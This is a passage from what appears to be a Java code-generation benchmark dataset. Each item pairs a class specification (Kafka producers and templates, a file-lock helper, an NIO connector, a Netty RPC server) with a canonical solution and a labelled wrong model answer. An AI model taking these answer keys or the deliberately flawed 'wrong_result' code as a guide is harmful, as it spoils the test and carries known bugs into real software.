    "Instruction": "Task Description: Create a KafkaTemplate class that provides a high-level abstraction for sending messages to Kafka topics, handling both transactional and non-transactional producers, and managing producer lifecycle.\n\nClass Description: The KafkaTemplate class is a Spring Kafka helper class that simplifies the process of sending messages to Kafka topics. It wraps a ProducerFactory and provides various methods for sending messages with different parameters. The class handles producer creation, message sending, and resource cleanup automatically.\n\nAttributes:\n- producerFactory: [ProducerFactory<K, V>] - The factory used to create Kafka producers\n- autoFlush: [boolean] - Flag indicating whether to automatically flush the producer after sending\n- transactional: [boolean] - Flag indicating whether the producer factory is transactional\n\nMethods:\n- send(String topic, V data) -> [CompletableFuture<SendResult<K, V>>] - Sends data to the specified topic without a key\n- send(String topic, K key, V data) -> [CompletableFuture<SendResult<K, V>>] - Sends data with a key to the specified topic\n- send(String topic, Integer partition, K key, V data) -> [CompletableFuture<SendResult<K, V>>] - Sends data with key and partition to the specified topic\n- send(ProducerRecord<K, V> record) -> [CompletableFuture<SendResult<K, V>>] - Sends a complete ProducerRecord\n- doSend(ProducerRecord<K, V> producerRecord) -> [CompletableFuture<SendResult<K, V>>] - Internal method that handles the actual sending logic\n- partitionsFor(String topic) -> [List<PartitionInfo>] - Returns partition information for the given topic\n- metrics() -> [Map<MetricName, ? extends Metric>] - Returns the producer metrics\n- closeProducer(Producer<K, V> producer, boolean inTx) -> [void] - Closes the producer unless in a transaction\n- getTheProducer() -> [Producer<K, V>] - Gets a producer instance (non-topic specific)\n- getTheProducer(String topic) -> [Producer<K, V>] - Gets a producer instance (optionally topic-specific)\n- inTransaction() -> [boolean] - Checks if currently in a transaction",
    "Canonical_solution": "import org.apache.kafka.clients.producer.Producer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.clients.producer.RecordMetadata;\nimport org.apache.kafka.common.Metric;\nimport org.apache.kafka.common.MetricName;\nimport org.apache.kafka.common.PartitionInfo;\nimport org.springframework.kafka.core.ProducerFactory;\nimport org.springframework.kafka.support.SendResult;\nimport org.springframework.util.Assert;\n\nimport java.util.List;\nimport java.util.Map;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.Future;\n\npublic class KafkaTemplate<K, V> {\n\n    private final ProducerFactory<K, V> producerFactory;\n    private final boolean autoFlush;\n    private final boolean transactional;\n\n    public KafkaTemplate(ProducerFactory<K, V> producerFactory) {\n        this(producerFactory, false);\n    }\n\n    public KafkaTemplate(ProducerFactory<K, V> producerFactory, boolean autoFlush) {\n        Assert.notNull(producerFactory, \"'producerFactory' cannot be null\");\n        this.producerFactory = producerFactory;\n        this.autoFlush = autoFlush;\n        this.transactional = this.producerFactory.transactionCapable();\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(String topic, @Nullable V data) {\n        ProducerRecord<K, V> producerRecord = new ProducerRecord<>(topic, data);\n        return doSend(producerRecord);\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(String topic, K key, @Nullable V data) {\n        ProducerRecord<K, V> producerRecord = new ProducerRecord<>(topic, key, data);\n        return doSend(producerRecord);\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(String topic, Integer partition, K key, @Nullable V data) {\n        ProducerRecord<K, V> producerRecord = new ProducerRecord<>(topic, partition, key, data);\n        return doSend(producerRecord);\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(ProducerRecord<K, V> record) {\n        Assert.notNull(record, \"'record' cannot be null\");\n        return doSend(record);\n    }\n\n    protected CompletableFuture<SendResult<K, V>> doSend(final ProducerRecord<K, V> producerRecord) {\n        final Producer<K, V> producer = getTheProducer(producerRecord.topic());\n        final CompletableFuture<SendResult<K, V>> future = new CompletableFuture<>();\n        Future<RecordMetadata> sendFuture = producer.send(producerRecord, (metadata, exception) -> {\n            if (exception == null) {\n                future.complete(new SendResult<>(producerRecord, metadata));\n            }\n            else {\n                future.completeExceptionally(\n                        new KafkaProducerException(producerRecord, \"Failed to send\", exception));\n            }\n            closeProducer(producer, this.transactional);\n        });\n        if (sendFuture.isDone()) {\n            try {\n                sendFuture.get();\n            }\n            catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n                throw new KafkaException(\"Interrupted\", e);\n            }\n            catch (ExecutionException e) {\n                throw new KafkaException(\"Send failed\", e.getCause());\n            }\n        }\n        if (this.autoFlush) {\n            producer.flush();\n        }\n        return future;\n    }\n\n    public List<PartitionInfo> partitionsFor(String topic) {\n        Producer<K, V> producer = getTheProducer();\n        try {\n            return producer.partitionsFor(topic);\n        }\n        finally {\n            closeProducer(producer, inTransaction());\n        }\n    }\n\n    public Map<MetricName, ? extends Metric> metrics() {\n        Producer<K, V> producer = getTheProducer();\n        try {\n            return producer.metrics();\n        }\n        finally {\n            closeProducer(producer, inTransaction());\n        }\n    }\n\n    protected void closeProducer(Producer<K, V> producer, boolean inTx) {\n        if (!inTx) {\n            producer.close();\n        }\n    }\n\n    protected Producer<K, V> getTheProducer() {\n        return getTheProducer(null);\n    }\n\n    protected Producer<K, V> getTheProducer(@Nullable String topic) {\n        if (this.transactional) {\n            Assert.state(inTransaction(),\n                    \"No transaction is in process; possible solutions: run the template operation within the scope of a template.executeInTransaction() operation\");\n            return this.producerFactory.createProducer();\n        }\n        else {\n            return this.producerFactory.createProducer();\n        }\n    }\n\n    public boolean inTransaction() {\n        return this.transactional && TransactionSynchronizationManager.getResource(this.producerFactory) != null;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "wrong_result": "```java\nimport org.apache.kafka.clients.producer.*;\nimport org.springframework.util.concurrent.ListenableFuture;\nimport org.springframework.util.concurrent.ListenableFutureCallback;\n\nimport java.util.List;\nimport java.util.Map;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class KafkaTemplate<K, V> {\n    private final ProducerFactory<K, V> producerFactory;\n    private final boolean autoFlush;\n    private final boolean transactional;\n    private final AtomicBoolean inTransaction = new AtomicBoolean(false);\n\n    public KafkaTemplate(ProducerFactory<K, V> producerFactory, boolean autoFlush, boolean transactional) {\n        this.producerFactory = producerFactory;\n        this.autoFlush = autoFlush;\n        this.transactional = transactional;\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(String topic, V data) {\n        return send(topic, null, data);\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(String topic, K key, V data) {\n        ProducerRecord<K, V> record = new ProducerRecord<>(topic, key, data);\n        return doSend(record);\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(String topic, Integer partition, K key, V data) {\n        ProducerRecord<K, V> record = new ProducerRecord<>(topic, partition, key, data);\n        return doSend(record);\n    }\n\n    public CompletableFuture<SendResult<K, V>> send(ProducerRecord<K, V> record) {\n        return doSend(record);\n    }\n\n    private CompletableFuture<SendResult<K, V>> doSend(ProducerRecord<K, V> record) {\n        Producer<K, V> producer = getTheProducer();\n        CompletableFuture<SendResult<K, V>> future = new CompletableFuture<>();\n        producer.send(record, (metadata, exception) -> {\n            if (exception != null) {\n                future.completeExceptionally(exception);\n            } else {\n                future.complete(new SendResult<>(record, metadata));\n            }\n            if (autoFlush) {\n                producer.flush();\n            }\n        });\n        return future;\n    }\n\n    public List<PartitionInfo> partitionsFor(String topic) {\n        Producer<K, V> producer = getTheProducer();\n        return producer.partitionsFor(topic);\n    }\n\n    public Map<MetricName, ? extends Metric> metrics() {\n        Producer<K, V> producer = getTheProducer();\n        return producer.metrics();\n    }\n\n    public void closeProducer(Producer<K, V> producer, boolean inTx) {\n        if (!inTx) {\n            producer.close();\n        }\n    }\n\n    public Producer<K, V> getTheProducer() {\n        return getTheProducer(null);\n    }\n\n    public Producer<K, V> getTheProducer(String topic) {\n        return producerFactory.createProducer();\n    }\n\n    public boolean inTransaction() {\n        return inTransaction.get();\n    }\n}\n```"
  },
  {
    "Task_id": 26,
    "Instruction": "Task Description: Create a Java class that manages job prefix files with thread-safe file operations, including creation, locking, and cleanup.\n\nClass Description: JobPrefixFile is a thread-safe utility class that manages temporary files with unique prefixes. It provides file locking mechanisms to prevent concurrent access issues and handles proper resource cleanup. The class implements AutoCloseable for proper resource management.\n\nAttributes:\n- prefix: String - The unique prefix used for the file name\n- file: Path - The path to the managed file\n- channel: FileChannel - The file channel for file operations\n- lock: FileLock - The lock object for thread-safe file access\n\nMethods:\n- create(Path directory) -> JobPrefixFile - Static factory method to create a new instance with default prefix in specified directory\n- create(String prefix, Path directory) -> JobPrefixFile - Static factory method to create a new instance with custom prefix in specified directory\n- tryFromExistingFile(Path file) -> JobPrefixFile - Static method to create an instance from an existing file if it can be locked\n- delete() -> void - Deletes the managed file and releases resources\n- prefix() -> String - Returns the file prefix\n- release() -> void - Releases the file lock and closes the channel\n- close() -> void - Calls release() to implement AutoCloseable interface\n- deleteIfExists(Path file) -> void - Helper method to safely delete a file if it exists\n- close(AutoCloseable closeable) -> void - Static helper method to safely close closeable resources",
    "Canonical_solution": "import com.google.common.base.Preconditions;\nimport java.io.IOException;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.FileLock;\nimport java.nio.channels.OverlappingFileLockException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\nimport java.util.concurrent.ThreadLocalRandom;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nclass JobPrefixFile implements AutoCloseable {\n\n  private static final Logger log = LoggerFactory.getLogger(JobPrefixFile.class);\n\n  private final String prefix;\n  private final Path file;\n\n  private FileChannel channel;\n  private FileLock lock;\n\n  public static JobPrefixFile create(Path directory) throws IOException {\n    return create(null, directory);\n  }\n\n  public static JobPrefixFile create(final String prefix, final Path directory)\n      throws IOException {\n    return new JobPrefixFile(prefix, directory);\n  }\n\n  public static JobPrefixFile tryFromExistingFile(final Path file) throws IOException {\n    Preconditions.checkNotNull(file);\n    final FileChannel channel = FileChannel.open(file, WRITE);\n    final FileLock lock;\n\n    try {\n      lock = channel.tryLock();\n    } catch (OverlappingFileLockException e) {\n      close(channel);\n      return null;\n    } catch (Exception e) {\n      close(channel);\n      throw e;\n    }\n\n    if (lock == null) {\n      close(channel);\n      return null;\n    }\n\n    return new JobPrefixFile(file, channel, lock);\n  }\n\n  private JobPrefixFile(final String prefix, final Path directory) throws IOException {\n    Preconditions.checkNotNull(directory);\n    this.prefix = prefix == null\n                  ? \"tmp-\" + new SimpleDateFormat(\"yyyyMMdd\").format(new Date()) + \"-\"\n                    + toHexString(ThreadLocalRandom.current().nextInt())\n                  : prefix;\n\n    Files.createDirectories(directory);\n    file = directory.resolve(this.prefix);\n    final Path tmp = directory.resolve(this.prefix + \".tmp\");\n    try {\n      this.channel = FileChannel.open(tmp, CREATE_NEW, WRITE);\n      this.lock = channel.lock();\n      Files.move(tmp, file);\n    } catch (Exception e) {\n      deleteIfExists(tmp);\n      deleteIfExists(file);\n      close(this.channel);\n      throw new RuntimeException(\"Failed to create job prefix file \" + file, e);\n    }\n  }\n\n  private JobPrefixFile(final Path file, final FileChannel channel, final FileLock lock)\n      throws IOException, IllegalStateException {\n    this.file = Preconditions.checkNotNull(file, \"file\");\n    this.channel = Preconditions.checkNotNull(channel, \"channel\");\n    this.lock = Preconditions.checkNotNull(lock, \"lock\");\n    this.prefix = file.getFileName().toString();\n  }\n\n  public void delete() {\n    release();\n    deleteIfExists(file);\n  }\n\n  private void deleteIfExists(Path file) {\n    if (file != null) {\n      try {\n        Files.deleteIfExists(file);\n      } catch (Exception e) {\n        log.warn(\"Failed to delete file {}\", file, e);\n      }\n    }\n  }\n\n  public String prefix() {\n    return prefix;\n  }\n\n  public void release() {\n    close(lock);\n    lock = null;\n    close(channel);\n    channel = null;\n  }\n\n  @Override\n  public void close() {\n    release();\n  }\n\n  private static void close(final AutoCloseable closeable) {\n    if (closeable != null) {\n      try {\n        closeable.close();\n      } catch (Exception e) {\n        log.debug(\"Failed to close {}\", closeable.getClass().getSimpleName(), e);\n      }\n    }\n  }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "```java\nimport java.io.IOException;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.FileLock;\nimport java.nio.file.*;\nimport java.nio.file.attribute.BasicFileAttributes;\n\npublic class JobPrefixFile implements AutoCloseable {\n    private final String prefix;\n    private final Path file;\n    private final FileChannel channel;\n    private final FileLock lock;\n\n    private JobPrefixFile(String prefix, Path file, FileChannel channel, FileLock lock) {\n        this.prefix = prefix;\n        this.file = file;\n        this.channel = channel;\n        this.lock = lock;\n    }\n\n    public static JobPrefixFile create(Path directory) throws IOException {\n        return create(\"job_\", directory);\n    }\n\n    public static JobPrefixFile create(String prefix, Path directory) throws IOException {\n        Path file = Files.createTempFile(directory, prefix, \".tmp\");\n        FileChannel channel = FileChannel.open(file, StandardOpenOption.WRITE, StandardOpenOption.READ);\n        FileLock lock = channel.tryLock();\n        if (lock == null) {\n            channel.close();\n            throw new IOException(\"Failed to acquire lock on file: \" + file);\n        }\n        return new JobPrefixFile(prefix, file, channel, lock);\n    }\n\n    public static JobPrefixFile tryFromExistingFile(Path file) throws IOException {\n        FileChannel channel = FileChannel.open(file, StandardOpenOption.READ, StandardOpenOption.WRITE);\n        FileLock lock = channel.tryLock();\n        if (lock == null) {\n            channel.close();\n            throw new IOException(\"Failed to acquire lock on existing file: \" + file);\n        }\n        return new JobPrefixFile(file.getFileName().toString(), file, channel, lock);\n    }\n\n    public void delete() throws IOException {\n        release();\n        Files.delete(file);\n    }\n\n    public String prefix() {\n        return prefix;\n    }\n\n    public void release() throws IOException {\n        if (lock != null) {\n            lock.release();\n        }\n        if (channel != null) {\n            channel.close();\n        }\n    }\n\n    @Override\n    public void close() throws IOException {\n        release();\n    }\n\n    public static void deleteIfExists(Path file) {\n        try {\n            if (Files.exists(file)) {\n                Files.delete(file);\n            }\n        } catch (IOException e) {\n            // Handle exception as needed\n        }\n    }\n\n    public static void close(AutoCloseable closeable) {\n        if (closeable != null) {\n            try {\n                closeable.close();\n            } catch (Exception e) {\n                // Handle exception as needed\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 260,
    "Instruction": "Task Description: Create a Java class that implements a Kafka Producer for sending maintenance plan messages to a Kafka topic.\n\nClass Description: The MaintenancePlanProducer class is responsible for producing and sending maintenance plan messages to a specified Kafka topic. It handles the configuration of the Kafka Producer, message sending, and resource cleanup.\n\nAttributes:\n- _producer: Producer<String, MaintenancePlan> - The Kafka Producer instance used to send messages to Kafka.\n\nMethods:\n- MaintenancePlanProducer(String bootstrapServers, Properties overrides) -> void - Constructor that initializes the Kafka Producer with the given bootstrap servers and optional configuration overrides.\n  - Input Parameters:\n    - bootstrapServers: String - Comma-separated list of Kafka broker addresses\n    - overrides: Properties - Optional additional Kafka Producer configuration properties\n- sendPlan(String topic, MaintenancePlan maintenancePlan) -> void - Sends a maintenance plan to the specified Kafka topic.\n  - Input Parameters:\n    - topic: String - The Kafka topic to send the message to\n    - maintenancePlan: MaintenancePlan - The maintenance plan object to be sent\n- close() -> void - Closes the Kafka Producer and releases all resources.\n  - No input parameters",
    "Canonical_solution": "import org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.Producer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.common.serialization.StringSerializer;\nimport java.util.Properties;\n\npublic class MaintenancePlanProducer {\n    private Producer<String, MaintenancePlan> _producer;\n\n    public MaintenancePlanProducer(String bootstrapServers, Properties overrides) {\n        Properties props = new Properties();\n        props.setProperty(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n        props.setProperty(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getCanonicalName());\n        props.setProperty(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, MaintenancePlanSerde.class.getCanonicalName());\n        \n        if (overrides != null) {\n            props.putAll(overrides);\n        }\n        \n        _producer = new KafkaProducer<>(props);\n    }\n\n    public void sendPlan(String topic, MaintenancePlan maintenancePlan) {\n        _producer.send(new ProducerRecord<>(topic, maintenancePlan), (recordMetadata, e) -> {\n            if (e != null) {\n                throw new RuntimeException(\"Failed to produce maintenance plan\", e);\n            }\n        });\n    }\n\n    public void close() {\n        _producer.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "wrong_result": "public class MaintenancePlanProducer {\n    private Producer<String, MaintenancePlan> _producer;\n\n    public MaintenancePlanProducer(String bootstrapServers, Properties overrides) {\n        Properties props = new Properties();\n        props.put(\"bootstrap.servers\", bootstrapServers);\n        props.put(\"key.serializer\", \"org.apache.kafka.common.serialization.StringSerializer\");\n        props.put(\"value.serializer\", \"com.example.MaintenancePlanSerializer\");\n        if (overrides != null) {\n            props.putAll(overrides);\n        }\n        _producer = new KafkaProducer<>(props);\n    }\n\n    public void sendPlan(String topic, MaintenancePlan maintenancePlan) {\n        ProducerRecord<String, MaintenancePlan> record = new ProducerRecord<>(topic, maintenancePlan);\n        _producer.send(record);\n    }\n\n    public void close() {\n        _producer.close();\n    }\n}"
  },
  {
    "Task_id": 261,
    "Instruction": "Task Description: Create a wrapper class for Kafka Producer to simplify message sending operations and resource management.\n\nClass Description: The KafkaProducerWrapper class provides a convenient interface for interacting with a Kafka Producer, handling message sending, flushing, and proper resource cleanup. It encapsulates a KafkaProducer instance and delegates operations to it.\n\nAttributes:\n- producer: Producer<K, V> - The underlying Kafka Producer instance that handles actual message production\n\nMethods:\n- Constructor: KafkaProducerWrapper(Map<String, Object> configs, Serializer<K> keySerializer, Serializer<V> valueSerializer) -> void - Initializes the wrapper with Kafka configuration, key serializer, and value serializer\n- send: send(ProducerRecord<K, V> record) -> Future<RecordMetadata> - Sends a message to Kafka without a callback\n- send: send(ProducerRecord<K, V> record, Callback callback) -> Future<RecordMetadata> - Sends a message to Kafka with a callback\n- flush: flush() -> void - Flushes any buffered messages\n- close: close() -> void - Closes the producer immediately\n- close: close(Duration timeout) -> void - Closes the producer with a specified timeout",
    "Canonical_solution": "import org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.Producer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.clients.producer.RecordMetadata;\nimport org.apache.kafka.common.serialization.Serializer;\nimport java.time.Duration;\nimport java.util.Map;\nimport java.util.concurrent.Future;\n\npublic class KafkaProducerWrapper<K, V> {\n\n    private final Producer<K, V> producer;\n\n    public KafkaProducerWrapper(Map<String, Object> configs, \n                              Serializer<K> keySerializer, \n                              Serializer<V> valueSerializer) {\n        this.producer = new KafkaProducer<>(configs, keySerializer, valueSerializer);\n    }\n\n    public Future<RecordMetadata> send(ProducerRecord<K, V> record) {\n        return producer.send(record);\n    }\n\n    public Future<RecordMetadata> send(ProducerRecord<K, V> record, Callback callback) {\n        return producer.send(record, callback);\n    }\n\n    public void flush() {\n        producer.flush();\n    }\n\n    public void close() {\n        producer.close();\n    }\n\n    public void close(Duration timeout) {\n        producer.close(timeout);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "wrong_result": "```java\nimport org.apache.kafka.clients.producer.*;\n\nimport java.util.Map;\nimport java.util.concurrent.Future;\nimport java.util.concurrent.TimeUnit;\n\npublic class KafkaProducerWrapper<K, V> {\n    private final Producer<K, V> producer;\n\n    public KafkaProducerWrapper(Map<String, Object> configs, Serializer<K> keySerializer, Serializer<V> valueSerializer) {\n        configs.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, keySerializer.getClass().getName());\n        configs.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, valueSerializer.getClass().getName());\n        this.producer = new KafkaProducer<>(configs);\n    }\n\n    public Future<RecordMetadata> send(ProducerRecord<K, V> record) {\n        return producer.send(record);\n    }\n\n    public Future<RecordMetadata> send(ProducerRecord<K, V> record, Callback callback) {\n        return producer.send(record, callback);\n    }\n\n    public void flush() {\n        producer.flush();\n    }\n\n    public void close() {\n        producer.close();\n    }\n\n    public void close(Duration timeout) {\n        producer.close(timeout.toMillis(), TimeUnit.MILLISECONDS);\n    }\n}\n```"
  },
  {
    "Task_id": 262,
    "Instruction": "Task Description: Implement a Java class that manages non-blocking HTTP connections using Java NIO (New I/O) capabilities. The class should handle connection establishment, connection queue management, and distribute connections across multiple processors for load balancing.\n\nClass Description: NIOConnector is a thread-based class that manages asynchronous HTTP connections using Java NIO. It maintains a queue of pending connections, establishes them asynchronously, and distributes successfully established connections to a pool of NIOProcessor instances for further processing.\n\nAttributes:\n- name: String - The name identifier for this connector thread\n- selector: Selector - The NIO selector used for monitoring connection events\n- connectQueue: BlockingQueue<BackendConnection> - Queue holding pending connection requests\n- processors: NIOProcessor[] - Array of processors for handling established connections\n- nextProcessor: int - Index for round-robin processor selection\n- connectCount: long - Counter for tracking connection attempts\n\nMethods:\n- NIOConnector(String name) -> void - Constructor that initializes the connector with a name and opens a new selector\n- setProcessors(NIOProcessor[] processors) -> void - Sets the array of processors for connection distribution\n- postConnect(BackendConnection c) -> void - Adds a new connection request to the queue and wakes up the selector\n- run() -> void - Main thread loop that handles connection establishment and event processing\n- connect(Selector selector) -> void - Processes pending connections from the queue\n- finishConnect(SelectionKey key, Object att) -> void - Completes the connection process for a channel\n- clearSelectionKey(SelectionKey key) -> void - Cleans up a selection key after processing\n- nextProcessor() -> NIOProcessor - Selects the next processor in round-robin fashion\n\nInner Class:\n- ConnectIdGenerator - Generates unique IDs for established connections with thread-safe incrementing",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.util.Set;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.concurrent.LinkedBlockingQueue;\n\nimport org.apache.log4j.Logger;\n\npublic final class NIOConnector extends Thread {\n    private static final Logger LOGGER = Logger.getLogger(NIOConnector.class);\n    private static final ConnectIdGenerator ID_GENERATOR = new ConnectIdGenerator();\n\n    private final String name;\n    private final Selector selector;\n    private final BlockingQueue<BackendConnection> connectQueue;\n    private NIOProcessor[] processors;\n    private int nextProcessor;\n    private long connectCount;\n\n    public NIOConnector(String name) throws IOException {\n        super.setName(name);\n        this.name = name;\n        this.selector = Selector.open();\n        this.connectQueue = new LinkedBlockingQueue<BackendConnection>();\n    }\n\n    public void setProcessors(NIOProcessor[] processors) {\n        this.processors = processors;\n    }\n\n    public void postConnect(BackendConnection c) {\n        connectQueue.offer(c);\n        selector.wakeup();\n    }\n\n    @Override\n    public void run() {\n        final Selector selector = this.selector;\n        for (;;) {\n            ++connectCount;\n            try {\n                selector.select(1000L);\n                connect(selector);\n                Set<SelectionKey> keys = selector.selectedKeys();\n                try {\n                    for (SelectionKey key : keys) {\n                        Object att = key.attachment();\n                        if (att != null && key.isValid() && key.isConnectable()) {\n                            finishConnect(key, att);\n                        } else {\n                            key.cancel();\n                        }\n                    }\n                } finally {\n                    keys.clear();\n                }\n            } catch (Throwable e) {\n                LOGGER.warn(name, e);\n            }\n        }\n    }\n\n    private void connect(Selector selector) {\n        BackendConnection c = null;\n        while ((c = connectQueue.poll()) != null) {\n            try {\n                c.connect(selector);\n            } catch (Throwable e) {\n                c.error(ErrorCode.ERR_CONNECT_SOCKET, e);\n            }\n        }\n    }\n\n    private void finishConnect(SelectionKey key, Object att) {\n        BackendConnection c = (BackendConnection) att;\n        try {\n            if (c.finishConnect()) {\n                clearSelectionKey(key);\n                c.setId(ID_GENERATOR.getId());\n                NIOProcessor processor = nextProcessor();\n                c.setProcessor(processor);\n                processor.postRegister(c);\n            }\n        } catch (Throwable e) {\n            clearSelectionKey(key);\n            c.error(ErrorCode.ERR_FINISH_CONNECT, e);\n        }\n    }\n\n    private void clearSelectionKey(SelectionKey key) {\n        if (key.isValid()) {\n            key.attach(null);\n            key.cancel();\n        }\n    }\n\n    private NIOProcessor nextProcessor() {\n        if (++nextProcessor == processors.length) {\n            nextProcessor = 0;\n        }\n        return processors[nextProcessor];\n    }\n\n    private static class ConnectIdGenerator {\n        private static final long MAX_VALUE = Long.MAX_VALUE;\n        private long connectId = 0L;\n        private final Object lock = new Object();\n\n        private long getId() {\n            synchronized (lock) {\n                if (connectId >= MAX_VALUE) {\n                    connectId = 0L;\n                }\n                return ++connectId;\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 20,
    "wrong_result": "public class NIOConnector {\n    private String name;\n    private Selector selector;\n    private BlockingQueue<BackendConnection> connectQueue;\n    private NIOProcessor[] processors;\n    private int nextProcessor;\n    private long connectCount;\n\n    public NIOConnector(String name) throws IOException {\n        this.name = name;\n        this.selector = Selector.open();\n        this.connectQueue = new LinkedBlockingQueue<>();\n        this.nextProcessor = 0;\n        this.connectCount = 0;\n    }\n\n    public void setProcessors(NIOProcessor[] processors) {\n        this.processors = processors;\n    }\n\n    public void postConnect(BackendConnection c) {\n        connectQueue.add(c);\n        selector.wakeup();\n    }\n\n    public void run() {\n        try {\n            while (!Thread.currentThread().isInterrupted()) {\n                int readyChannels = selector.select();\n                if (readyChannels > 0) {\n                    Set<SelectionKey> selectedKeys = selector.selectedKeys();\n                    Iterator<SelectionKey> it = selectedKeys.iterator();\n                    while (it.hasNext()) {\n                        SelectionKey key = it.next();\n                        if (key.isConnectable()) {\n                            finishConnect(key, key.attachment());\n                        }\n                        it.remove();\n                    }\n                }\n                connect(selector);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void connect(Selector selector) throws IOException {\n        BackendConnection connection;\n        while ((connection = connectQueue.poll()) != null) {\n            SocketChannel channel = SocketChannel.open();\n            channel.configureBlocking(false);\n            channel.register(selector, SelectionKey.OP_CONNECT, connection);\n            connectCount++;\n        }\n    }\n\n    private void finishConnect(SelectionKey key, Object att) {\n        BackendConnection connection = (BackendConnection) att;\n        SocketChannel channel = (SocketChannel) key.channel();\n        try {\n            if (channel.finishConnect()) {\n                NIOProcessor processor = nextProcessor();\n                if (processor != null) {\n                    processor.handleConnection(channel, connection);\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            clearSelectionKey(key);\n        }\n    }\n\n    private void clearSelectionKey(SelectionKey key) {\n        key.cancel();\n        try {\n            key.channel().close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private NIOProcessor nextProcessor() {\n        if (processors == null || processors.length == 0) {\n            return null;\n        }\n        NIOProcessor processor = processors[nextProcessor];\n        nextProcessor = (nextProcessor + 1) % processors.length;\n        return processor;\n    }\n\n    static class ConnectIdGenerator {\n        private final AtomicInteger idGenerator = new AtomicInteger(0);\n\n        public int generateId() {\n            return idGenerator.getAndIncrement();\n        }\n    }\n}"
  },
  {
    "Task_id": 269,
    "Instruction": "Task Description: Create a Java class that implements an RPC server using Netty framework for handling network communication, managing connections, and processing RPC requests.\n\nClass Description: RpcServer is an abstract remoting server implementation that provides RPC functionality using Netty. It handles server initialization, startup, shutdown, and connection management while supporting various network configurations and user-defined processors.\n\nAttributes:\n- logger: Logger - Logger instance for server operations\n- bootstrap: ServerBootstrap - Netty server bootstrap configuration\n- channelFuture: ChannelFuture - Future representing server channel binding\n- userProcessors: ConcurrentHashMap<String, UserProcessor<?>> - Map of registered user processors\n- bossGroup: EventLoopGroup - Event loop group for accepting connections\n- workerGroup: EventLoopGroup - Event loop group for handling connections\n- addressParser: RemotingAddressParser - Parser for remote addresses\n- connectionManager: DefaultServerConnectionManager - Manager for server connections\n- rpcRemoting: RpcRemoting - RPC communication handler\n- codec: Codec - Protocol codec for encoding/decoding messages\n\nMethods:\n- RpcServer(int port, boolean manageConnection) -> void - Constructor that initializes server with port and connection management flag\n- doInit() -> void - Initializes server components including bootstrap configuration and pipeline setup\n- doStart() -> boolean - Starts the server and binds to specified port\n- doStop() -> boolean - Stops the server and releases resources\n- registerUserProcessor(UserProcessor<?> processor) -> void - Registers a user-defined processor for handling requests\n- invokeSync(Connection conn, Object request, int timeoutMillis) -> Object - Synchronously invokes RPC call with specified timeout",
    "Canonical_solution": "import com.alipay.remoting.*;\nimport com.alipay.remoting.config.BoltGenericOption;\nimport com.alipay.remoting.config.BoltServerOption;\nimport com.alipay.remoting.rpc.protocol.UserProcessor;\nimport com.alipay.remoting.util.NettyEventLoopUtil;\nimport com.alipay.remoting.util.RemotingUtil;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.PooledByteBufAllocator;\nimport io.netty.buffer.UnpooledByteBufAllocator;\nimport io.netty.channel.*;\nimport io.netty.channel.epoll.EpollEventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.handler.flush.FlushConsolidationHandler;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.ExecutorService;\n\npublic class RpcServer extends AbstractRemotingServer {\n\n    private static final Logger logger = LoggerFactory.getLogger(\"RpcRemoting\");\n    private ServerBootstrap bootstrap;\n    private ChannelFuture channelFuture;\n    private ConcurrentHashMap<String, UserProcessor<?>> userProcessors = new ConcurrentHashMap<>(4);\n    private final EventLoopGroup bossGroup = NettyEventLoopUtil.newEventLoopGroup(1, new NamedThreadFactory(\"Rpc-netty-server-boss\", false));\n    private static final EventLoopGroup workerGroup = NettyEventLoopUtil.newEventLoopGroup(Runtime.getRuntime().availableProcessors() * 2, new NamedThreadFactory(\"Rpc-netty-server-worker\", true));\n    private RemotingAddressParser addressParser;\n    private DefaultServerConnectionManager 